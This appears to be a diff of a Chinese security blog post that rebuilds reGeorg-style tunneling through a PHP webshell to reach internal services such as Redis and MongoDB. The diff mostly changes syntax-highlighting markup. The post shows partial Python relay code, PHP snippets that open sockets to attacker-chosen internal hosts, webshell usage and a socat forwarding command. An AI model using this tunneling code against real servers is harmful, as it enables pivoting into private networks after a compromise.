@@ -40,18 +40,18 @@
       <p>背景: linux，php环境下的reGeorg不可用。
 目标: 分析reGeorg的原理尝试改一下
 结果: 造了一个半成品，因为不能保持socks连通，可以用来访问简单的协议流数据。比如http，mongo，redis</p>
-<div class="highlight"><pre><span></span><span class="n">Protocols</span> <span class="n">that</span> <span class="k">are</span> <span class="n">suitable</span> <span class="k">to</span> <span class="n">smuggle</span>
+<div class="highlight"><pre><span></span><code><span class="n">Protocols</span> <span class="n">that</span> <span class="k">are</span> <span class="n">suitable</span> <span class="k">to</span> <span class="n">smuggle</span>
   <span class="n">HTTP</span> <span class="n">based</span> <span class="n">protocol</span><span class="p">:</span>
     <span class="n">Elastic</span><span class="p">,</span> <span class="n">CouchDB</span><span class="p">,</span> <span class="n">Mongodb</span><span class="p">,</span> <span class="n">Docker</span>
 
   <span class="nb">Text</span><span class="o">-</span><span class="n">based</span> <span class="n">protocol</span><span class="p">:</span>
     <span class="n">FTP</span><span class="p">,</span> <span class="n">SMTP</span><span class="p">,</span> <span class="n">Redis</span><span class="p">,</span> <span class="n">Memcached</span>
-</pre></div>
+</code></pre></div>
 
 
 <h3>尝试1</h3>
 <p>这个脚本是个残的:</p>
-<div class="highlight"><pre><span></span><span class="c1">#coding: utf-8</span>
+<div class="highlight"><pre><span></span><code><span class="c1">#coding: utf-8</span>
 <span class="kn">import</span> <span class="nn">socket</span>
 <span class="kn">import</span> <span class="nn">binascii</span>
 <span class="kn">import</span> <span class="nn">requests</span>
@@ -81,7 +81,7 @@
     <span class="k">print</span> <span class="n">data2</span>
     <span class="k">print</span> <span class="s2">&quot;sending data&quot;</span>
     <span class="n">sock</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">data2</span><span class="p">)</span>
-</pre></div>
+</code></pre></div>
 
 
 <p><strong>hex2bin is available with PHP Version &gt;= 5.4.0</strong></p>
@@ -91,64 +91,64 @@
  mongo --port 8888  //连接8888</code></p>
 <p>发散一下，这个整体就是一个请求代理，包裹一下发送到了远程的webshell，然后webshell之行脚本。Regeorg是更通用的方式，你可以把这个脚本看作regeorg作用的<code>子集</code>，因为如果要访问端口之类的就需要改脚本了。</p>
 <p>看了看Regeorg的实现，就是接受socks5或者socks4的代理之后，发送数据包到远程服务器，过程大概是这样子的:</p>
-<div class="highlight"><pre><span></span><span class="k">Connect</span>: 连接之后生成一个<span class="nv">cookie</span>
+<div class="highlight"><pre><span></span><code><span class="n">Connect</span><span class="o">:</span> <span class="err">连接之后生成一个</span><span class="n">cookie</span>
 
-<span class="nv">Forward</span>: 把要请求的数据包放在<span class="nv">cookie</span>里面的<span class="nv">writebuf</span>
+<span class="n">Forward</span><span class="o">:</span> <span class="err">把要请求的数据包放在</span><span class="n">cookie里面的writebuf</span>
 
-<span class="nv">Read</span>: <span class="nv">Regeorg</span>的脚本读取<span class="nv">writbuf</span>的数据包之后请求接口服务，比如<span class="nv">curl</span>访问内网端口。然后把结果写入到<span class="nv">cookie</span>里面的<span class="nv">readbuf</span>，读取<span class="nv">readbuf</span>的内容
+<span class="n">Read</span><span class="o">:</span> <span class="n">Regeorg的脚本读取writbuf的数据包之后请求接口服务</span><span class="err">，比如</span><span class="n">curl访问内网端口</span><span class="err">。然后把结果写入到</span><span class="n">cookie里面的readbuf</span><span class="err">，读取</span><span class="n">readbuf的内容</span>
 
-<span class="k">Disconnect</span>: 把<span class="nv">cookie</span>里面的<span class="nv">run</span>标志变为<span class="nv">false</span>，<span class="nv">cookie</span>就不再使用了。
-</pre></div>
+<span class="n">Disconnect</span><span class="o">:</span> <span class="err">把</span><span class="n">cookie里面的run标志变为false</span><span class="err">，</span><span class="n">cookie就不再使用了</span><span class="err">。</span>
+</code></pre></div>
 
 
 <p>所以当Regeorg不能使用的时候，比如第一步的connect无法生成。
 上面脚本的过程是这样子的: 我看了看regeorg的源代码，百思不得其解为什么connect没生成，调试了几天没结果。（好菜.jpg)，这个时候我发现regeorg的php原理基本就是上面的步骤。所以我就手动写脚本尝试可行。</p>
 <p>有一个不知道是什么坑的问题: 当我把ip作为变量发送到远程服务器的时候，远程服务器会出现epool_wait的错误。但是当整个脚本放在远程服务器的时候就可以运行了。</p>
-<div class="highlight"><pre><span></span>失败:
+<div class="highlight"><pre><span></span><code><span class="nx">失败</span><span class="o">:</span>
 
-<span class="o">&lt;</span>?<span class="nv">php</span>
-$<span class="nv">ip</span> <span class="o">=</span> $<span class="nv">_POST</span>[<span class="s1">&#39;</span><span class="s">ip</span><span class="s1">&#39;</span>]<span class="c1">;</span>
-$<span class="nv">port</span> <span class="o">=</span> $<span class="nv">_POST</span>[<span class="s1">&#39;</span><span class="s">port</span><span class="s1">&#39;</span>]<span class="c1">;</span>
-<span class="mh">$c</span><span class="nv">om</span> <span class="o">=</span> $<span class="nv">_POST</span>[<span class="s1">&#39;</span><span class="s">command</span><span class="s1">&#39;</span>]<span class="c1">;</span>
-$<span class="nv">payload</span> <span class="o">=</span> <span class="mh">$c</span><span class="nv">om</span>.<span class="s1">&#39;</span><span class="s">\r</span><span class="se">\n</span><span class="s1">&#39;</span><span class="c1">;</span>
-$<span class="nv">res</span> <span class="o">=</span> <span class="nv">fsockopen</span><span class="ss">(</span>$<span class="nv">ip</span>,<span class="ss">(</span><span class="nv">int</span><span class="ss">)</span>$<span class="nv">port</span>,<span class="mh">$e</span><span class="nv">rrno</span>, <span class="mh">$e</span><span class="nv">rrstr</span><span class="ss">)</span><span class="c1">;</span>
-<span class="o">//</span>$<span class="nv">res</span> <span class="o">=</span> <span class="nv">stream_socket_client</span><span class="ss">(</span><span class="s2">&quot;</span><span class="s">tcp://127.0.0.1:6379</span><span class="s2">&quot;</span>, <span class="mh">$e</span><span class="nv">rrno</span>, <span class="mh">$e</span><span class="nv">rrstr</span><span class="ss">)</span><span class="c1">;</span>
-<span class="nv">var_dump</span><span class="ss">(</span>$<span class="nv">res</span><span class="ss">)</span><span class="c1">;</span>
-<span class="nv">stream_set_timeout</span><span class="ss">(</span><span class="mi">1</span><span class="ss">)</span><span class="c1">;</span>
-<span class="nv">stream_set_blocking</span><span class="ss">(</span><span class="nv">false</span><span class="ss">)</span><span class="c1">;</span>
-<span class="nv">fwrite</span><span class="ss">(</span>$<span class="nv">res</span>,$<span class="nv">raw</span><span class="ss">)</span><span class="c1">;</span>
-<span class="k">while</span> <span class="ss">(</span>$<span class="nv">o</span><span class="o">=</span><span class="nv">fgets</span><span class="ss">(</span>$<span class="nv">res</span>,<span class="mi">5</span><span class="ss">))</span>{
-$<span class="nv">readbuf</span> .<span class="o">=</span> $<span class="nv">o</span><span class="c1">;</span>
-}
-<span class="nv">var_dump</span><span class="ss">(</span>$<span class="nv">readbuf</span><span class="ss">)</span><span class="c1">;</span>
+<span class="cp">&lt;?php</span>
+<span class="nv">$ip</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;ip&#39;</span><span class="p">];</span>
+<span class="nv">$port</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;port&#39;</span><span class="p">];</span>
+<span class="nv">$com</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;command&#39;</span><span class="p">];</span>
+<span class="nv">$payload</span> <span class="o">=</span> <span class="nv">$com</span><span class="o">.</span><span class="s1">&#39;\r\n&#39;</span><span class="p">;</span>
+<span class="nv">$res</span> <span class="o">=</span> <span class="nb">fsockopen</span><span class="p">(</span><span class="nv">$ip</span><span class="p">,(</span><span class="nx">int</span><span class="p">)</span><span class="nv">$port</span><span class="p">,</span><span class="nv">$errno</span><span class="p">,</span> <span class="nv">$errstr</span><span class="p">);</span>
+<span class="c1">//$res = stream_socket_client(&quot;tcp://127.0.0.1:6379&quot;, $errno, $errstr);</span>
+<span class="nb">var_dump</span><span class="p">(</span><span class="nv">$res</span><span class="p">);</span>
+<span class="nb">stream_set_timeout</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+<span class="nb">stream_set_blocking</span><span class="p">(</span><span class="k">false</span><span class="p">);</span>
+<span class="nb">fwrite</span><span class="p">(</span><span class="nv">$res</span><span class="p">,</span><span class="nv">$raw</span><span class="p">);</span>
+<span class="k">while</span> <span class="p">(</span><span class="nv">$o</span><span class="o">=</span><span class="nb">fgets</span><span class="p">(</span><span class="nv">$res</span><span class="p">,</span><span class="mi">5</span><span class="p">)){</span>
+<span class="nv">$readbuf</span> <span class="o">.=</span> <span class="nv">$o</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="nb">var_dump</span><span class="p">(</span><span class="nv">$readbuf</span><span class="p">);</span>
 
-<span class="nv">fclose</span><span class="ss">(</span>$<span class="nv">res</span><span class="ss">)</span><span class="c1">;</span>
-</pre></div>
+<span class="nb">fclose</span><span class="p">(</span><span class="nv">$res</span><span class="p">);</span>
+</code></pre></div>
 
 
-<div class="highlight"><pre><span></span>成功:
+<div class="highlight"><pre><span></span><code><span class="nx">成功</span><span class="o">:</span>
 
-<span class="o">&lt;</span>?<span class="nv">php</span>
-$<span class="nv">res</span> <span class="o">=</span> <span class="nv">fsockopen</span><span class="ss">(</span><span class="s2">&quot;</span><span class="s">127.0.0.1</span><span class="s2">&quot;</span>,<span class="mi">6379</span><span class="ss">)</span><span class="c1">;</span>
-$<span class="nv">raw</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="s">info\r</span><span class="se">\n</span><span class="s2">&quot;</span><span class="c1">;</span>
-<span class="nv">stream_set_timeout</span><span class="ss">(</span>$<span class="nv">res</span>,<span class="mi">1</span><span class="ss">)</span><span class="c1">;</span>
-<span class="nv">stream_set_blocking</span><span class="ss">(</span><span class="nv">false</span><span class="ss">)</span><span class="c1">;</span>
-<span class="nv">fwrite</span><span class="ss">(</span>$<span class="nv">res</span>,$<span class="nv">raw</span><span class="ss">)</span><span class="c1">;</span>
-$<span class="nv">info</span> <span class="o">=</span> <span class="nv">stream_get_meta_data</span><span class="ss">(</span>$<span class="nv">res</span><span class="ss">)</span><span class="c1">;</span>
-<span class="nv">echo</span> $<span class="nv">info</span>[<span class="s1">&#39;</span><span class="s">timed_out</span><span class="s1">&#39;</span>]<span class="c1">;</span>
-<span class="k">while</span> <span class="ss">(</span>$<span class="nv">o</span> <span class="o">=</span><span class="nv">fgets</span><span class="ss">(</span>$<span class="nv">res</span>,<span class="mi">5</span><span class="ss">))</span>{
-        <span class="k">if</span><span class="ss">(</span>$<span class="nv">o</span> <span class="o">===</span> <span class="nv">false</span><span class="ss">)</span>{<span class="nv">echo</span> <span class="s1">&#39;</span><span class="s">false lala</span><span class="s1">&#39;</span><span class="c1">;}</span>
-$<span class="nv">readBuff</span> .<span class="o">=</span> $<span class="nv">o</span><span class="c1">;</span>
-}
-<span class="nv">var_dump</span><span class="ss">(</span>$<span class="nv">readBuff</span><span class="ss">)</span><span class="c1">;</span>
-</pre></div>
+<span class="cp">&lt;?php</span>
+<span class="nv">$res</span> <span class="o">=</span> <span class="nb">fsockopen</span><span class="p">(</span><span class="s2">&quot;127.0.0.1&quot;</span><span class="p">,</span><span class="mi">6379</span><span class="p">);</span>
+<span class="nv">$raw</span> <span class="o">=</span> <span class="s2">&quot;info</span><span class="se">\r\n</span><span class="s2">&quot;</span><span class="p">;</span>
+<span class="nb">stream_set_timeout</span><span class="p">(</span><span class="nv">$res</span><span class="p">,</span><span class="mi">1</span><span class="p">);</span>
+<span class="nb">stream_set_blocking</span><span class="p">(</span><span class="k">false</span><span class="p">);</span>
+<span class="nb">fwrite</span><span class="p">(</span><span class="nv">$res</span><span class="p">,</span><span class="nv">$raw</span><span class="p">);</span>
+<span class="nv">$info</span> <span class="o">=</span> <span class="nb">stream_get_meta_data</span><span class="p">(</span><span class="nv">$res</span><span class="p">);</span>
+<span class="k">echo</span> <span class="nv">$info</span><span class="p">[</span><span class="s1">&#39;timed_out&#39;</span><span class="p">];</span>
+<span class="k">while</span> <span class="p">(</span><span class="nv">$o</span> <span class="o">=</span><span class="nb">fgets</span><span class="p">(</span><span class="nv">$res</span><span class="p">,</span><span class="mi">5</span><span class="p">)){</span>
+        <span class="k">if</span><span class="p">(</span><span class="nv">$o</span> <span class="o">===</span> <span class="k">false</span><span class="p">){</span><span class="k">echo</span> <span class="s1">&#39;false lala&#39;</span><span class="p">;}</span>
+<span class="nv">$readBuff</span> <span class="o">.=</span> <span class="nv">$o</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="nb">var_dump</span><span class="p">(</span><span class="nv">$readBuff</span><span class="p">);</span>
+</code></pre></div>
 
 
 <p>所以我到了现在这一步，其实是中间发现antsword的扫描端口原理，就是包装好数据包发送到远程服务器，远程服务器做一个eval。</p>
 <p>既然是eval了，那么就是跟xss一个原理: 你有了一个"编辑器"。</p>
 <p>所以呢，再看看前面的regeorg的原理，剩下最后一步了，改造上面的脚本，让他适合proxychains。</p>
 <h3>尝试2</h3>
-<div class="highlight"><pre><span></span><span class="c1"># coding: utf-8</span>
+<div class="highlight"><pre><span></span><code><span class="c1"># coding: utf-8</span>
 <span class="kn">import</span> <span class="nn">socket</span>
 <span class="kn">import</span> <span class="nn">binascii</span>
 <span class="kn">import</span> <span class="nn">urllib</span>
@@ -277,7 +277,7 @@ $<span class="nv">readBuff</span> .<span class="o">=</span> $<span class="nv">o<
             <span class="n">sendPayload</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span><span class="n">flag</span><span class="p">)</span>
     <span class="k">except</span> <span class="ne">KeyboardInterrupt</span><span class="p">:</span>
         <span class="nb">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
-</pre></div>
+</code></pre></div>
 
 
 <p>使用方法: <code>python rego.py &lt;webshell&gt; &lt;webshell's pass&gt;</code> </p>
@@ -296,8 +296,8 @@ $<span class="nv">readBuff</span> .<span class="o">=</span> $<span class="nv">o<
 </ol>
 <p>为什么reGeorg就可以？因为reGeorg用<code>while true</code>循环保持了socks连接，通过写入cookie的数据进行交互。</p>
 <p>测试主要使用了socat转发流量:</p>
-<div class="highlight"><pre><span></span><span class="n">socat</span> <span class="o">-</span><span class="n">x</span> <span class="o">-</span><span class="n">d</span> <span class="o">-</span><span class="n">v</span> <span class="n">tcp</span><span class="o">-</span><span class="k">listen</span><span class="p">:</span><span class="mi">8888</span><span class="p">,</span><span class="n">reuseaddr</span><span class="p">,</span><span class="n">fork</span> <span class="n">tcp</span><span class="p">:</span><span class="mi">127</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">1</span><span class="p">:</span><span class="mi">8889</span>
-</pre></div>
+<div class="highlight"><pre><span></span><code><span class="err">socat -x -d -v tcp-listen:8888,reuseaddr,fork tcp:127.0.0.1:8889</span>
+</code></pre></div>
 
 
 <h3>END</h3>
